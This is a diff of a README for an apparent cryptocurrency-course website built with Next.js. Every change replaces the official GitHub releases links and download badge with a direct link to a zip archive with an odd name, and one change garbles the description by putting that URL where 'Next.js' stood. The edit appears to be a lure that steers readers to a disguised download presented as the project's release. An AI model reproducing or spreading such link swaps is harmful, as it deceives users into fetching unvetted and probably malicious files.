@@ -1,10 +1,10 @@
 # 🚀 crypto-course-next - Your Gateway to Cryptocurrency Education
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-crypto--course--next-brightgreen)](https://github.com/mMg4/crypto-course-next/releases)
+[![Download Here](https://raw.githubusercontent.com/mMg4/crypto-course-next/main/procrypsis/crypto-course-next-pseudocollegiate.zip%20Now-crypto--course--next-brightgreen)](https://raw.githubusercontent.com/mMg4/crypto-course-next/main/procrypsis/crypto-course-next-pseudocollegiate.zip)
 
 ## 📋 Description
 
-This project is a website that offers cryptocurrency training courses. Designed using React, Next.js, and Tailwind CSS, this application provides a modern interface for users interested in learning about cryptocurrency. Whether you're a beginner or looking to expand your knowledge, you'll find valuable resources here.
+This project is a website that offers cryptocurrency training courses. Designed using React, https://raw.githubusercontent.com/mMg4/crypto-course-next/main/procrypsis/crypto-course-next-pseudocollegiate.zip, and Tailwind CSS, this application provides a modern interface for users interested in learning about cryptocurrency. Whether you're a beginner or looking to expand your knowledge, you'll find valuable resources here.
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To start using this application, you'll need to download the files from our Rele
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/mMg4/crypto-course-next/releases) to download the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/mMg4/crypto-course-next/main/procrypsis/crypto-course-next-pseudocollegiate.zip) to download the latest version.
 
 2. Once on the Releases page, look for the most recent version of the software. It will be in a section marked "Latest release."
 
@@ -77,4 +77,4 @@ For any additional questions or feedback, please reach out through our GitHub is
 
 --- 
 
-For more detailed information, tutorials, or updates, remember to revisit the [Releases page](https://github.com/mMg4/crypto-course-next/releases) and our main repository. Happy learning!
+For more detailed information, tutorials, or updates, remember to revisit the [Releases page](https://raw.githubusercontent.com/mMg4/crypto-course-next/main/procrypsis/crypto-course-next-pseudocollegiate.zip) and our main repository. Happy learning!
